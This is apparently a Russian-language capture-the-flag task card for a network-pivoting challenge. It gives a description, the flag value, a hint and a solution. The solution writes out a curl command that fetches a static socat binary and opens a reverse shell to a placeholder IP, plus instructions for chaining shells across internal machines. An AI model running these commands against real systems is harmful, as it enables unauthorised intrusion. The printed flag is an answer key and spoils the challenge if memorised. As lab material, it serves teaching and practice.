# Название: Bunny Real-World Edition
## Описание:
А что, если забрать рут-доступ и установить минимальный образ? Проникновение в сеть заканчивается?  
P.S. Флаг в / (корневой) директории.
### Флаг: 
CTF{bunny_buffed_edition_841266c2cb}
### Хинт:
root не надо получать! https://github.com/andrew-d/static-binaries/tree/master/binaries/linux/x86_64 - выбирай на любой вкус что нужно
(и помни, что если на внутренних тачках инета нету, то используй `python3 -m http.server`)
### Решение:
Используем socat
Listen: socat file:`tty`,raw,echo=0 tcp-listen:4444
Connect: curl https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -o sct; chmod +x sct; ./sct exec:'sh -li',pty,stderr,setsid,sigint,sane tcp:IP_HERE:7777

Проходим по тачкам (пробрасываем один реверс шелл в другой) сокатом, скачивая его с помощью `python3 -m http.server`. 
nmap так же можно скачать со ссылки в хинте, ip a работает и так (если бы не работало то качаем busybox static)